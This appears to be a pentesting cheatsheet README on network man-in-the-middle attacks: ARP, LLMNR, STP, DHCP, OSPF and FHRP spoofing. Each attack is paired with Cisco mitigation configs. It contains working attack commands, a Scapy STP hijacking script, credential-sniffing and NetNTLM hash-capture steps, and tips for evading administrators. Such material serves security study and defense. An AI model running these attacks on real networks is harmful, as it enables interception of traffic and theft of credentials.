# MITMonster

A monster cheatsheet on MITM attacks

![](/images/mitmonster-cover.png)

# Disclaimer

All information contained in this repository is provided for educational and research purposes only. The author is not responsible for any harm caused by using this information.

# Table of Contents
* [Prologue](#Prologue)
* [Croc in the Middle](#croc-in-the-middle-by-s0i37-l1)
* [Link Layer Attacks](#link-layer-attacks-l2)
	* [ARP Cache Poisoning](#arp-cache-poisoning)
	* [LLMNR/NBT-NS/mDNS Poisoning](#llmnrnbt-nsmdns-poisoning)
	* [STP Root Spoofing](#stp-root-spoofing)
	* [DHCPv4 Spoofing](#dhcp-spoofing-version-4)
	* [DHCPv6 Spoofing](#dhcp-spoofing-version-6)
* [Network Layer Attacks](#network-layer-attacks-l3)
	* [Evil Twin against Dynamic Routing](#evil-twin-against-dynamic-routing-ospf)
	* [FHRP Spoofing](#first-hop-redundancy-spoofing)

# Prologue

Only practical MITM attacks that have a tangible impact are collected here. No theoretical attacks, only working techniques. In order to conduct MITM cautiously, I'll provide some helpful tips below.

## TTL shift

A +1 incremental TTL offset allows the attacker's IP address to be hidden from the victim's packet trace, reducing the risk of compromising the attacker's actions. This is done with a single rule in the mangle table.

```bash
sudo iptables -t mangle -A PREROUTING -i ethX -j TTL --ttl-inc 1
```

## Traffic forward

One of the main rules of MITM is to allow routing on your host, otherwise there will be unintentional DoS, traffic from legitimate hosts will bump into your computer

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects
```

## Hardware

Take care of the power of your hardware, it should be ready to handle the traffic of several dozen legitimate hosts. This applies to your interface as well. If you are going to spoof hosts with a gigabit interface and you have a 100 Mbytes/second connection, the network speed will suffer and collapse. Users will quickly notice that the network is freezing and call the sysadmins, and they (if they're not getting paid for nothing) will figure out what's wrong. So the pentest will no longer be a secret, and you will have to blush in front of the admins.

Here are the recommended iron parameters:

- 4 CPU cores;
- 8 GB RAM;
- network interface with full duplex, 1 Gbps or higher. It's good if you can connect an Ethernet adapter via the high-speed Thunderbolt 3/4 interface.

However, you're likely to run up against the capabilities of the switch port you're connected to. If there's a 1Gbps link there, you can't go much higher than that. Be sure to keep an eye on network behavior.

## NAT

One of the main rules of MITM is NAT configuration. Usually attackers make do with a single command:

```bash
sudo iptables -t nat -A POSTROUTING -o ethX -j MASQUERADE
```

Without NAT configured, an attacker will not be able to see the second part of the traffic, which could potentially contain credentials. This is because of asymmetric routing - where traffic goes one way but comes back another. With masquerading, asymmetric routing does not prevent an attacker from seeing traffic going both ways.

However, if for example there are Zabbix agents in the network and after MITM they will be behind your host - network connectivity between Zabbix server and agents may be broken. Be careful. There are some risks to having a NAT.

## FW

Before conducting MITM, make sure that there are no interfering rules on the FW

```bash
sudo iptables -L
sudo iptables -t nat -L
sudo iptables -t mangle -L
sudo iptables -t raw -L
```

## NAT helper

FTP, H.323 and SIP traffic can pass through you. These are No NAT Friendly protocols and you need the `nf_conntrack` module to make them work with NAT. With MITM, the attacker must enable NAT to see traffic going both ways.

```bash
sudo modprobe nf_conntrack
```

## Subnet mask length

When doing ARP spoofing, do not spoof too large subnet masks, otherwise the load on your CPU will be higher than it can handle, which will cause the network to hang.

## Credentials sniffing

A classic of the genre is to use [Dsniff](https://github.com/hackerschoice/dsniff) or [Pcredz](https://github.com/lgandx/PCredz) or [net-creds](https://github.com/DanMcInerney/net-creds) to identify credentials and other sensitive information in traffic

```bash
sudo dsniff -i ethX -v
sudo python3 ./Pcredz -i ethX -v
sudo python2 net-creds.py -i ethX
```

# Croc-in-the-middle by s0i37 (L1)

## Theory

Security researcher Andrey Zhukov, under the alias [s0i37](https://t.me/s0i37) , released an article about intercepting traffic with special "crocs" he uses to interfere with Ethernet wiring. This is how one-way MITM occurs.

![Attacker cable](/images/croc-in-the-middle-attacker-cable.jpg)

![Connecting to twisted pair](/images/croc-in-the-middle-connecting-to-twisted-pair.jpg)

![Traffic sniffing](/images/croc-in-the-middle-sniffing-traffic.jpg)

## Links

Article link: https://hackmag.com/security/croc-in-the-middle/

A screen version of this article: https://youtu.be/AIyi98RBpzI

# Link Layer Attacks (L2)

## ARP Cache Poisoning

The most popular MITM attack, it is characterized by its simplicity. By sending IS-AT ARP frames, the attacker imposes his address as the default gateway address for the MITM attack.

### Attack Impact

MITM

### Tools

Use one of these tools to redirect traffic.

#### [ARP-MITM](https://github.com/hackerschoice/thc-arpmitm)

```
sudo arpmitm -t <Router-IP>
```

#### [Ettercap](https://github.com/Ettercap/ettercap)

```
sudo ettercap -G
```

### Mitigations

To prevent ARP Spoofing on your network, you need a combination of DHCP Snooping and Dynamic ARP Inspection. The presence of DHCP Snooping is mandatory and it is important that it is fully populated, without this table DAI will block all host network traffic, i.e. a shot in the foot!

**Cisco IOS Example (DHCP Snooping):**

Setting up DHCP Snooping is basically assigning trusted and untrusted ports. On untrusted ports, all DHCP messages will be monitored. The goal is to see if they are generated by the DHCP server. After all, if we see messages like `DHCPLEASEQUERY`, `DHCPOFFER` and `DHCPACK` on the user segment, it is definitely an anomaly and there is a DHCP server on the user network.

On trusted ports, all DHCP messages will be considered legitimate. Typically, trusted ports are configured on connections between switches and routers, and untrusted ports are configured on ports where end stations (e.g., computer, printer, access points, VoIP) are connected.

```
Monster(config)# interface g0/2
Monster(config)# ip dhcp-server <IP ADDRESS>
Monster(config)# ip dhcp snooping
Monster(config)# ip dhcp snooping vlan <VLAN ID>
```

If necessary, you can create a static entry in the DHCP Snooping database:

```
Monster(config)# ip dhcp snooping binding <MAC> vlan <VLAN ID> <IP ADDRESS> interface <INTERFACE ID> expiry <SECONDS>
```

Commands for debugging and checking DHCP Snooping:

```
Monster(config)# show ip dhcp snooping
Monster(config)# show ip dhcp snooping statistics
Monster(config)# show ip dhcp snooping binding
```

For reliability, it is necessary to write the contents of the DHCP Snooping table to the switch memory: if the switch suddenly goes into reboot and the DHCP Snooping table is lost. If this happens together with Dynamic ARP Inspection, we will get network paralysis:

```
Monster(config)# ip dhcp snooping database flash:/snooping.db
```

The Snooping database can be not only stored in the switch memory, but also transmitted via FTP, HTTP, RCP, SCP, TFTP services

```
Monster(config)# ip dhcp snooping database ?
  flash:
  ftp:
  https:
  rcp:
  scp:
  tftp:
  timeout:
  write-delay
```

**Cisco IOS Example (Dynamic ARP Inspection):**

DAI allows you to prevent ARP spoofing within the network by tracking all ARP traffic. And there is a very important point here. In order for inspection to work, it needs to be based on something, and all of its work is directly dependent on DHCP Snooping. DAI based on the DHCP Snooping table will check the validity of ARP responses, that is, to see if the MAC address and IP address are actually bound within the network. If not, DAI will instantly block such traffic.

DAI configuration relies on the same concept of trusted and untrusted ports. As with DHCP Snooping, all switch ports are untrusted by default. Otherwise, it's the same: trusted ports are ports between switches and routers, untrusted ports are user ports. On untrusted ports, you should enable IP Source Guard (IPSG), which will check the source of requests.

```
Monster(config)# int g0/2
Monster(config-if)# ip arp inspection trust
Monster(config)# interface range f0/1-24
Monster(config-if-range)# ip verify source
```

If necessary, you can create an ARP ACL to avoid checking devices with a static IP. In case there are hosts on your network with a static address.

```
Monster(config-if)# arp access-list DAI
Monster(config-arp-nacl)# permit ip host <IP> mac host <MAC>
```

After finishing the configuration and making sure that the required static addresses are assigned and the DHCP Snooping table is fully saturated, we enable DAI itself. DAI, like DHCP Snooping, is enabled on VLAN segments

```
Monster(config)# ip arp inspection vlan <VLAN ID>
```

## LLMNR/NBT-NS/mDNS Poisoning

A common attack against Windows networks. The attacker responds to all queries of these protocols and gives its address when the computer searches for the target host name.

### Attack Impact

Credentials Interception against Windows hosts

### Tools

[Responder](https://github.com/lgandx/Responder)

```bash
sudo responder -I ethX -vv
```

### Mitigations

Disabling the LLMNR and NBT-NS protocols. But disabling MDNS is more complicated, as it is used for printers, macOS, Chromecast. However, attacks on mDNS can be monitored at the IDS level. There is a risk of network disruption if MDNS traffic is restricted.

## STP Root Spoofing

The essence of this attack is to hijack the role of the root switch by injecting the BPDU frame with the lowest priority value. However, this will only result in a partial MITM attack.

### Attack Impact

Partial MITM

### Tools

Scapy

```python
from scapy.all import *

INTERFACE = "eth0"
ATTACKER_MAC = "00:11:22:33:44:55"
STP_MCAST = "01:80:C2:00:00:00"

def spoof():
    frame = Dot3(src=ATTACKER_MAC, dst=STP_MCAST)
    llc_layer = LLC(dsap=0x042, ssap=0x042, ctrl=3)
    mal_bpdu = STP(rootmac=ATTACKER_MAC, bpduflags=0x01, bridgemac=ATTACKER_MAC)
    mal_stp_bpdu = frame / llc_layer / mal_bpdu
    print("[!] Beginning of root switch role hijacking. . .")
    sendp(mal_stp_bpdu, iface=INTERFACE, inter=2, loop=1, verbose=1)

spoof()
```

### Mitigations

Enabling BPDU Guard will block the port from which the BPDU frame will be sent, which is how an attacker hijacks the role of the root switch.

**Cisco IOS Example:**

```bash
Monster(config)# interface range f0/1-24
Monster(config-if-range)# spanning-tree bpduguard enable
```

## DHCP Spoofing (Version 4)

The attacker raises a false DHCP server on his host to impose his address as the default gateway address for clients receiving the address automatically. This results in a MITM attack.

When attacking a DHCP server, keep track of the DHCP Lease Time timer, which indicates when the client's dynamic address is leased. This is one of the parameters of your bogus DHCP server. If your attack time is less than the DHCP Lease timer, it could lead to an unintended DoS. Clients will still think their gateway is you, but you have already shut down the DHCP server. This will make MITM no longer a secret and you will attract unnecessary attention from network administrators.
Properly calculate this timer and the time during which spoofing will occur. Also calculate the size of the address space so that your hardware can handle forwarding traffic from legitimate hosts. (based on the capabilities of your hardware)

### Attack Impact

MITM

### Tools

[Yersinia](https://github.com/tomac/yersinia)

```
sudo yersinia -G
```

### Mitigations

DHCP Snooping is required to protect against this attack. In "Link Layer Attacks -> ARP Cache Poisoning -> Mitigations" you will find the necessary information and commands.

## DHCP Spoofing (Version 6)

mitm6 is one of the most popular tools among pentesters. Its concept is to respond to DHCPv6 requests (via DHCPv6 ADVERTISE) from Windows machines, causing legitimate Windows machines to think of the attacker as a DNS server at the IPv6 level.
MITM6 can be blocked using VMAPs against UDP port 547, which is used by a DHCPv6 server inside the segment. Obviously, such a server inside the segment is an anomaly. This is an alternative way to deal with this tool, although there is already a fairly popular method is to simply turn off IPv6, but this arrangement will not work for every infrastructure. Also RA GUARD may be suitable as an alternative, but it is not available in all network devices.

With this attack, the attacker imposes his address as the address of a DNS server at the IPv6 level

### Attack Impact

MITM

### Tools

[mitm6](https://github.com/dirkjanm/mitm6)

```bash
mitm6 -h
```

### Mitigations

RA Guard, Filtering via VMAP's, Disabling IPv6 on a Windows network when it is not in use

**Filtering via VMAP's Example (Cisco IOS):**

The method is experimental, you have to be careful with it.

```
Monster(config)# ipv6 access-list MITM6
Monster(config-ext-acl)# permit udp any eq 547 any

Monster(config)# vlan access-map BLOCKMITM6 seq 10
Monster(config-vlan-map)# match ipv6 address MITM6
Monster(config-vlan-map)# action drop log
Monster(config)# vlan access-map BLOCKMITM6 seq 20
Monster(config-vlan-map)# action forward

Monster(config)# vlan filter BLOCKMITM6 vlan-list <VLAN ID>
```

The switch will now filter DHCPv6 messages and will not allow mitm6 traffic in a `UDP/547` context. This will prevent an attacker from imposing itself as a DNS server at the IPv6 layer.

### Links

Article Link: https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/

# Network Layer Attacks (L3)

## Evil Twin against Dynamic Routing (OSPF)

### The problem of MITM attacks against dynamic routing

Performing a MITM attack against dynamic routing is **IMPOSSIBLE** because route injection against a host on another segment creates a routing loop.
However, I have found an Evil Twin attack vector where you can **IMPERSONATE** the target host

### Mechanics

An attacker would use the [FRRouting](https://frrouting.org/) virtual router to interfere with dynamic routing

The main idea of this attack is to redistribute a static route with the lowest metric into an OSPF network. This network will be used as a vector for false route injection. FRR makes it possible to operate with static routing and its redistribution, which releases me from the need to use discrete utilities (Loki, Scapy, etc)

Suppose you want to spoof an SMB service under the address `10.1.1.33/32`, you need to configure such a route and distribute it across the network using redistribution. In this example, the target dynamic routing would be OSPF.

**Setting up an OSPF network, the attacker declares his address to connect in OSPF and specifies a zone**

```
monster# conf ter
monster(config)# router ospf
monster(config-router) network 192.168.31.2/32 area 0.0.0.0
monster(config-router) redistribute static metric 0
```

Another factor is route cost. Using FRR, I am going to specify a zero-cost static route redistribution. The lower is this metric, the more preferable is the route. And since I specify the `/32` mask during the injection, the chance that the injected route will be added to the routing table is very high. This is because the packet received by the router will go to the network with the largest mask (in the `10.1.1.33/32 via 192.168.31.2` route format)

**Injection structure:**

```
monster(config)# ip route 10.1.1.33/32 ethX
```

Now I have to create a secondary address on the network interface equal to the address of the target SMB share since the traffic will come to my host via destination ip `10.1.1.1.33/32`

```bash
sudo ifconfig ethX:1 10.1.1.33 netmask 255.255.255.255
```

Now all traffic intended for this SMB share will go to my host. After that, I can deploy a simple SMB server using [impacket](https://github.com/fortra/impacket) and intercept encrypted user credentials (i.e. NetNTLM hashes) that can be subsequently brute-forced or relayed (NTLM Relay)

```bash
sudo impacket-smbserver -smb2support sharePath /home/caster/smb-share
~/toolkit/net-creds$ sudo python2 net-creds.py -i ethX
```

Exercise caution when you interfere in the routing process! The above-described attack is extremely aggressive: when users go to some SMB share for their files, they won’t find nothing there. Since you’re spoofing this share, you might be able to deploy a copy of it. You will collect enough hashes pretty soon, and then you can stop the attack. It’s not recommended to procrastinate the exploitation; otherwise, legitimate employees would become upset, while your covert pentesting study won’t be a secret anymore.

Due to the high convergence rate in OSPF, once your injected route is deadvertised, the routing table structure will quickly return to its initial (i.e. before the attack) state. The convergence rate is four seconds. However, everything depends on the network size since all routers must update their tables. Again, exercise caution!

```
monster(config)# no ip route 192.168.100.1/32 ethX
```

### Attack Impact

Evil Twin

### Mitigations

Use passive interfaces, cryptographic authentication. This will prevent an attacker from interfering with the dynamic routing process and introducing false routes

**Passive Interfaces Configuration (Cisco IOS)**

```
Monster(config)# router ospf X
Monster(config-if)# passive-interface GigabitEthernet X/X
```

**OSPF Cryptographic Authentication (Cisco IOS)**

```
Monster(config)# interface GigabitEthernet X/X
Monster(config-if)# ip ospf authentication message-digest
Monster(config-if)# ip ospf message-digest-key <KEY ID> md5 <KEYSTRING>
```

### Links

Caster - [Nightmare Spoofing](https://hackmag.com/security/ospf-evil-twin/)

## First Hop Redundancy Spoofing

First Hop Redundancy Protocol (FHRP) is a class of protocols ensuring network gateway redundancy. The idea is to combine multiple physical routers into one logical router with a common IP address. This address of the virtual router will be assigned to the interface of the master router responsible for traffic forwarding. The most popular protocols in the FHRP class are HSRP and VRRP.

The attack occurs by stealing the Master role from the FHRP router, thus the attacker performs a MITM attack and wraps the traffic of the entire segment onto itself, a very audacious attack. This is done by injecting the FHRP packet with the highest priority value.

### Attack Impact

MITM

### Tools

[Loki](https://github.com/Raizo62/Loki_on_Kali)

### Mitigations

Authentication, Highest Priority.

Authentication will prevent illegitimate routers from entering the fault tolerance process. If an engineer intends to protect FHRP in this manner, a strong passphrase is required.

**Example of MD5 authentication for HSRP:**

```
Monster(config-if)# standby X authentication md5 key-string <KEYSTRING>
```

**Example of MD5 authentication for VRRP:**

```
Monster(config-if)# vrrp X authentication md5 key-string <KEYSTRING>
```

For security reasons, it is recommended to set the maximum priority on the Master or Active router. That way, if an attacker sends a malicious packet with a priority of 255, he will not be able to become the "master" because he already has one. 

However, this will not work for VRRP because the maximum priority that can be set is 254. Therefore, it would make more sense to use either authentication or even ACL-based filtering.

Example of setting the maximum priority for HSRP:

```
Monster(config)# int g0/0
Monster(config-if)# standby 1 priority 255
```

### Links

Caster - [FHRP Nightmare](https://medium.com/@casterbyte/fhrp-nightmare-pentesting-redundancy-systems-like-a-devil-aeeb7d40e766)
